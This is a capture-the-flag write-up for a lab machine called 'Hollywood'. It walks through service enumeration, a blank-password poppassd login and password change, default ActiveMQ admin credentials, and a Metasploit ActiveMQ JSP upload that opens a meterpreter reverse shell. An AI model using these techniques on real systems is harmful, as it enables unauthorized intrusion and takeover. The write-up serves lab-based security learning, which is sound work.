## Enumeration

### FTP Enumeration

Let's see the **FTP server** hosted on the victim's machine, We can see that it is **FileZilla service**.

```bash
$ ftp 10.150.150.219 
Connected to 10.150.150.219.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (10.150.150.219:pyke):
```

Maybe we can find some exploits related to its **version**!

I have found an exploit related to this **FileZilla** version at this [github](https://github.com/NeoTheCapt/FilezillaExploit) repository, We can see it at the exploiation phase after we do all our enumerations.

### SMTP Enumeration

We can see from the **Nmap scanner** report that the **SMTP** server is **Mercury**, After some **googling** i didn't find any exploits except **DoS** attacks which i don't think it is our objective. 

Also, I have ran an **Nmap script** to know the commands that i can run in the **SMTP** server.
```bash
$ nmap -p25 --script smtp-commands 10.150.150.219
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-05 11:49 EST

Parallel DNS resolution of 1 host. Timing: About 0.00% done

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME

Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

### Finger Enumeration

I have found that there is a port associated with a service called **finger**, which it is my first time seeing it.

The **Name/Finger Protocol (FINGER)** is an application-level Internet protocol thatÂ provides an interface between the finger command and the fingerd daemon. 
The fingerd daemon returns information about the users currently logged in to a specified remote host.

Okay, Let's see if we can get anything out of it.

#### Banner Grabbing/Basic connection
```
$ nc -vn 10.150.150.219 79
(UNKNOWN) [10.150.150.219] 79 (finger) open

Login: Admin         Name: Mail System Administrator
```

So, We know that there is a user called **Admin** and he is the **Mail System Administrator**.

### POP3 Enumeration

So, There are two ports associated with **POP** services, Let's if we can get benefit from them.

```bash
106/tcp   open  pop3pw       Mercury/32 poppass service
110/tcp   open  pop3         Mercury/32 pop3d
|_pop3-capabilities: USER EXPIRE(NEVER) APOP TOP UIDL
```

#### 106 Port

```bash
$ nc -nv 10.150.150.219 106                                                                         
(UNKNOWN) [10.150.150.219] 106 (poppassd) open
200 localhost MercuryW PopPass server ready.
help
100-Mercury PopPass Server v4.62
100-This server recognizes the following commands:
100-   USER     Enter your user (login) name
100-   PASS     Enter the password matching your username
100-   NEWPASS  Change your password on this system.
100-   QUIT     Logout and close the connection.
100 You must login using USER/PASS before attempting NEWPASS.
```

Okay, I have got an idea whis is to login with user `Admin` and password as blank, Let's see!

```bash
USER Admin
300 Send current password using PASS command:
PASS 
200 OK, 'Admin' logged in.
```

Wow, It worked!

Now, Let's get a new password for the user `Admin`!

```bash
NEWPASS test
200 OK, password changed.
```

Okay, So we have a user `Admin` and password `test`, Let's get to the other **POP** service!

#### 110 Port

```bash
$ nc -nv 10.150.150.219 110                                                                         
(UNKNOWN) [10.150.150.219] 110 (pop3) open
+OK <12787729.18997@localhost>, POP3 server ready.
HELP 
+OK
Mercury/32 MTS Post Office Protocol v3 server v4.62,
Copyright (c) 1993-2008 David Harris.
This server recognizes the following commands:
  USER - login as a user
  PASS - specify a password
  APOP - perform secure login
  CAPA - RFC2449 capability discovery
  STLS - Start TLS negotiation, if enabled
  STAT - show mailbox statistics
  RETR - send a message
  LIST - show message numbers and sizes
  DELE - delete a message
  RSET - 'undo' all mailbox changes
  TOP  - show lines from a message
  QUIT - close the connection
  NOOP, RPOP, LAST are also supported.

Extended commands:
  XTND XMIT  - Send a message via POP3
  XTND XLST  - Eudora extended list command
  UIDL - return unique identifier (RFC1725).
.
```

Let's login with our credientials!
```bash
USER Admin
+OK Admin is known here.
PASS test
+OK Welcome! 0 messages (0 bytes)
```

I think this is a **Rabbit hole** and nothing is important in those ports.

### HTTP Enumeration

#### 80 Port
![http](post/Hollywood_PwnTillDawn/imgs/1.JPG)

It is the home page of **XAMPP** server that host the website for Windows machines.

If we have got into any directory that doesn't exist and we viewed the **source page**, We will see the first **flag** in it.

_FLAG30_
![http](post/Hollywood_PwnTillDawn/imgs/7.JPG)

Nothing else is here that is important!

#### 2224 Port

![http2](post/Hollywood_PwnTillDawn/imgs/2.JPG)

It looks like this **HTTP service** is hosting the **Mercury SMTP** mailing management services.

When we click on the link shown above it redirect us to a form that manage the mailing subscription services.


![http2_2](post/Hollywood_PwnTillDawn/imgs/3.JPG)

I think nothing else is valuable here!

#### 8080 Port

![http3](post/Hollywood_PwnTillDawn/imgs/4.JPG)

At this **HTTP** port there is a an **Apache Tomcat** server is hosted but in order to go to the **Manager App** we need credientials.

![http3_2](post/Hollywood_PwnTillDawn/imgs/5.JPG)

#### 8161 Port

![http4](post/Hollywood_PwnTillDawn/imgs/6.JPG)

In this **HTTP** port there is **Apache ActiveMQ** hosted on it!

We can do some search for this service and see what we can do with it?

**ActiveMQ** is an open source protocol developed by Apache which functions as an implementation of message-oriented middleware (MOM). Its basic function is toÂ **send messages between different applications**, but includes additional features like STOMP, JMS, and OpenWire.

If we clicked on the link **Manage ActiveMQ broker** it will pop up a login form for the **admin** access.

So I have searched for the default credientials for the admin account and they've said that:

The default administration user name and password for the Apache ActiveMQ Administration Console isÂ **admin** and **admin**Â respectively. You should change these default credentials.

So, I have tried it and it worked!

_FLAG33_
![http4_2](post/Hollywood_PwnTillDawn/imgs/8.JPG)

Now, We have to get a **Reverse shell** in order to get the last flag from the system.

## Exploitation

Let's search if there are any exploits for **Apache ActiveMQ**!

I came across an exploit from the [Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/apache_activemq_upload_jsp/) and we will use **Metasploit** ofcourse in order to this exploit which will be a **Web Shell** upload.

Let's make our way to get the **RevShell**!

```bash
msf6 > use exploit/multi/http/apache_activemq_upload_jsp
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_activemq_upload_jsp) > show targets

Exploit target:

payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_activemq_upload_jsp) > run
```

Boom! We got the **Meterpreter** Shell

```bash
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//pKFhVUPzZsgES.jar

meterpreter > getuid

```

Now, Let's switch up to the **CMD shell** and navigate to get our last flag.
